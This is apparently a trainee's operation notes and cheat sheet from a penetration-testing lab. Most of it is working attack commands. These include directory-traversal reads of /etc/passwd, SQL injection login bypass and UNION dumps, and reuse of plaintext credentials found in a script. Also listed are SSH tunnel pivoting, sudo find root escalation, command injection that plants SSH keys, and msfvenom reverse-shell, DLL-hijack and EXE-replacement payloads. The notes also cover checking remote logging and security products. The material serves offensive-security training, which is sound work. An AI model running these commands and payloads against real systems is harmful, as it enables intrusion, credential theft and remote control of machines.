# OP NOTES
```
10.50.34.63
.
nmap -Pn -T4 10.50.34.63 --http-enum 
OUTPUT :
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

## Found File Lookup box with input under
## http://10.50.34.63/getcareers.php?myfile=Web_Server_Admin.html
../../../../../../../etc/passwd - acquired
../../../../../../../etc/hosts - acquired

## ! Found login page with input under 
## http://10.50.34.63/login.html
## ' OR 1='1 inserted in username/password 
## 'Welcome Aaron' greeting presented following injection
## Inspect Element -> Network and Use GET request -> Request
username=tom+%27+OR+1%3D%271&passwd=tom+%27+OR+1%3D%271
## Form data -> RAW , copy and paste in url as below
http://10.50.34.63/login.php?username=tom+%27+OR+1%3D%271&passwd=tom+%27+OR+1%3D%271
## INSERT ? after php if    ^   needed

## ! Found a "scripts" directory 
## Contains development.py
## Credentials inside of a script?
  user2
  EaglesIsARE78

## Used above creds for Direct SSH to box

ssh -MS /tmp/jump user2@10.50.34.63
ssh -S /tmp/jump dum -O forward -D 9050
nmap -Pn -T4 10.50.34.63 --http-enum
ssh -S /tmp/jump dum -O forward -L 10001:192.168.28.181:22 -L 10002:192.168.28.181:80
firefox localhost:10002

## Website opens with a product selection and submit button 
## After hitting submit a ?product=1 in url is shown

http://localhost:10002/pick.php?product=7 OR 1=1
## Using SQL GET method - 7 is     ^   vulnerable field

## Identifying Columns
http://localhost:10002/pick.php?product=7 UNION SELECT 1,2,3

## Golden Statement
http://localhost:10002/pick.php?product=7 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

## Craft Statement to query databases and columns
localhost:10002/pick.php?product=7 UNION SELECT user_id,username,name FROM mysql.users


##  !Back to PublicFacingWebsite box
##  Using previously discovered ip scanning the rest of subnet for other hosts
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done 2>/dev/null

## Discovered 192.168.28.172
proxychains nmap -T4 -Pn 192.168.28.172 -p 20-10000
ssh -S /tmp/jump dum -O forward -L 10003:192.168.28.172:22
ssh Aaron@localhost -p 10003

# On Round Sensor
sudo -l 

## Aaron can run sudo find 
## Used GTFO bins to find a way to elevate privs
sudo find . -exec /bin/sh \; -quit
## Elevated to root on box

ip a
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done 2>/dev/null
## Discovered RoundSensor can talk to another hidden machine at 192.168.28.179

## Canceled Original Dynamic 
ssh -S /tmp/jump dum -O cancel -D 9050

## Setup new MS 
ssh -MS /tmp/t1 Aaron@localhost -p 10003 -NT
ssh -S /tmp/t1 dum -O forward -D 9050

proxychains nmap -Pn -T4 192.168.28.179 --script=http-enum
ssh -S /tmp/t1 dum -O forward -L 10005:192.168.28.179:22 -L 10006:192.168.28.179:135 -L 10007:192.168.28.179:139 -L 10008:192.168.28.179:445 -L 10009:192.168.28.179:3389 -L 10010:192.168.28.179:9999

## SSH works with Lroth user on Windows-ws
ssh Lroth@localhost -p 10005
xfreerdp /v:localhost:10009 /u:Lroth /dynamic-resolution +glypch-cache +clipboard

OR

## Port 9999 Sercure Server open on Windows-ws
LINOPS > cd /home/student/Downloads/winsploit 
vim winbuff.py (Change IP to victim)
msfvenom -p windows/shell/reverse_tcp lhost=10.50.31.135 lport=6969 -b "\x00" -f python
!! (LHOST IS LINOPS ip) ^
## Insert generated payload into script !! buf = b"" not neccessary

msfconsole
use multi/handler
show options
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 6969 #Make sure this port matches previously established in msfvenom command
run

## Order of execution
1)run multihandler in msfconsole
2)run winbuff.py script 
```

# Module Review Notes 
## Recon/PostEx
```
nmap --scan=http-enum
for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from" &) ; done 2>/dev/null

!! Check source code (CTRL + U) on website

!! When on Box
cat /etc/hosts
cat /etc/passwd
ip a
ip neigh
arp -a

sudo -l
!! Check GTFObins

find / -type f -perm /4000 -ls 2>/dev/null   #FIND SUID ONLY FILES
find / -type f -perm /2000 -ls 2>/dev/null   #FIND SGID ONLY FILES
find / -type f -perm /6000 -ls 2>/dev/null   #FIND SUID/SGID FILES

find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
#Search for any file or directory that is writable by the context "other"
find / -type f -writable -o -type d -writable 2>/dev/null
#Search for any file or directory that is writable by the current user

#Cron daemon runs as root
https://crontab.guru/

/var/spool/cron/crontabs  #User level jobs
/etc/crontab              #System level jobs
/etc/cron.*               #Hourly,Daily,Weekly

crontab -l                #lists for current user
contab -u <user> -l       #lists for a specified user

find /var/spool/cron/crontabs /etc/cron* -writable -ls
#Finds any cron file or directory that can be written to.

find /etc/cron* -type f -exec grep -Eo '/.*' {} \;
#Find potential path and filename by looking for any entry that starts with a slash


```
## WebEx
```
SQL, MALICIOUS FILE UPLOAD, DIRECTORY TRAVERSAL, COMMAND INJECTION

DIRECTORY TRAVERSAL - "File to search for"
../../../ 
view_image.php?file=../../../../../etc/passwd 
```

## COMMAND INJECTION - Server Runs commands for you
```
; whoami
; cat /etc/passwd 

UPLOAD PUBLICKEY
ssh keys stored in /etc/ssh
ssh-keygen -t rsa -b 4096
cat .ssh/id_rsa
cat .ssh/id_rsa.pub

; ls -lisa /var/www/
; mkdir /var/www/.ssh
; ls -lisa /var/www/.ssh
; echo "your_public_key_here" >> /var/www/.ssh/authorized_keys

ssh -i .ssh/id_rsa www-data@x.x.x.x
```

## SQL GET METHOD IN URL
```
1) Find Vulnerable Field
Go to each field
?Selection=1 OR 1=1
?Selection=2 OR 1=1 <-- Vulnerable

2) Identify Columns
?Selection=2 UNION SELECT 1,2,3

3) Craft Golden statement - DUMPS ALL INFO 
?selection=1 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns

4) Craft Query
?Selection=2 UNION SELECT name,pass,3 FROM session.user
?Selection=2 UNION SELECT name,pass,@@version FROM session.user
```
## SQL POST METHOD
```
1) Identify Vulnerable Field
--> Audi' OR 1='1

2) Identify Columns
Audi' UNION SELECT 1,2,3,4,5 #

3) Craft Golden Statement - DUMPS ALL Info about Database
Audi' UNION SELECT table_schema,2,table_name,column_name, FROM information_schema.columns #
ANNOTATE DATA DUMPED

Audi' UNION SELECT <column>,<column>,<column>,<column> FROM database.table

4) Craft Query
Audi' UNION SELECT studentID,2,username,passwd,5 FROM session.userinfo  #
Audi' UNION SELECT 1,2,name,pass,5 FROM session.user #
Audi' UNION SELECT carid,2,type,4,5 FROM session.car
```

## Reverse Engineering 
```
Ghidra
Strings
!! Find Success statement and work backwards

(Needs to be an even number)
x = param1
if( x % 2 = 0){
  printf("Success")
}

( x must equal 228) 
x = param1
if( x / 4 = 57){
  printf("Success")
}

(Bit Shifting to the Right answwer is 1, work backwards)
x = param1
if( x << 4 = 16){
  printf("Success")
}
```

## ExploitDev 
## See notes 

## PostEx Cont.
```
Check for remote logging
    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules

    Older version only uses /etc/rsyslog.conf

    Find out
    grep "IncludeConfig" /etc/rsyslog.conf

Check for security products
  !! Clam
  !! Rkhunter

```

## WindowsEX
```
# DLL hijacking
Run procmon --> https://live.sysinternals.com/
-- filters ---
process name contains filename.exe
path contains .dll
result is NAME NOT FOUND
-------
run executable

LINOPS> msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
Windows> SCP from LinOps

## if process gets hung up and need to run again
(get-process | ? {$.name -contains "file"}).kill()


# EXE Replacement
## Find a User created service that you can Rename
## Must be able to write to directory/rename file
## backupfile

msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe
scp student@x.x.x.x:/home/student/putty.exe C:\users\student\desktop


# AUDITPOL Logging
Show all audit category settings
auditpol /get /category:*

Shows what is actually being logged
auditpol /get /category:* | findstr /i "success failure"
```






